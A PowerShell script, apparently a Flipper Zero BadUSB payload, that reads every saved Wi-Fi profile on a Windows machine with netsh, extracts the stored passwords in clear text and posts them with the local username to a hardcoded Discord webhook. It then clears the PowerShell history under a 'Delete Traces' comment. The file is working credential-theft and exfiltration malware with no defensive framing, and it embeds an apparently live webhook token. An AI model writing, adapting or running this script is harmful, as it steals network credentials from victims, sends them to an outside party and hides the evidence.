# Get the first 10 Wi-Fi profiles
$wifiProfiles = netsh wlan show profiles | Select-Object

# Define the webhook URL
$webhook_url = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
$content = '```ml'
$content += -NewLine

$wifiProfiles | ForEach-Object {
    $profileName = $_ | Select-String 'Perfil de todos los usuarios\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value
    }
    $wifiProfileDetails = netsh wlan show profile name="$profileName" key=clear

    $wifiPassword = $wifiProfileDetails | Select-String 'Contenido de la clave\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value
    }

    $username = $env:username + " | " + $profileName

    if ($wifiPassword) {
        $content += "Wi-Fi password $profileName : $wifiPassword`n"  # Use `n for a newline
    }

}

$content += '```'

$message_data = @{
    'username' = $username + "Flipper"
    'content'  = $content
}

Invoke-WebRequest -Uri $webhook_url -Method Post -ContentType "application/json" -Body ($message_data | ConvertTo-Json)

# Delete Traces
Clear-History